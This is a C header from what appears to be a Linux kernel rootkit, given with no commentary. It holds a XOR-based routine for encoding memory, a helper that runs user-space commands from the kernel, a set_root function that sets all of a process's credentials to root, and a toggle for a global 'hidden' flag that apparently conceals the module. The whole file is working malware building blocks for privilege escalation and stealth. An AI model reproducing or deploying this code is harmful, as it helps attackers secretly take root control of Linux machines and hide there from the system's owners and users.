#include <linux/version.h>
#include <linux/kallsyms.h>
#include <linux/cred.h>

#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 14, 0)
# include <linux/kmod.h>
#else
# include <linux/umh.h>
#endif

#define do_encrypt(ptr, len, key)	do_encode(ptr, len, key)
#define do_decrypt(ptr, len, key)	do_encode(ptr, len, key)
static inline unsigned int custom_rol32(unsigned int val, int n)
{   
	return ((val << n) | (val >> (32 - n)));
}

static inline void do_encode(void *ptr, unsigned int len, unsigned int key)
{
	while (len > sizeof(key)) {
		*(unsigned int *)ptr ^= custom_rol32(key ^ len, (len % 13));
		len -= sizeof(key), ptr += sizeof(key);
	}
}
static inline int exec(char **argv)
{
	char *envp[] = {"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL}; 
	
	return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
	
}
static void set_root (void){
    struct cred* root;
	root = prepare_creds();
	if(root == NULL){
		return ;
	}
	root->uid.val = 0 ;
	root->gid.val = 0 ;
    root->suid.val = 0 ;
	root->sgid.val =  0;
	root->euid.val  = 0 ;
	root->egid.val  = 0 ;
	root->fsuid.val = 0 ;
	root->fsgid.val = 0 ;
	commit_creds(root);
}

extern int hidden;

static inline void flip_hidden_flag(void)
{
    if (hidden)
        hidden = 0;
    else
        hidden = 1;
}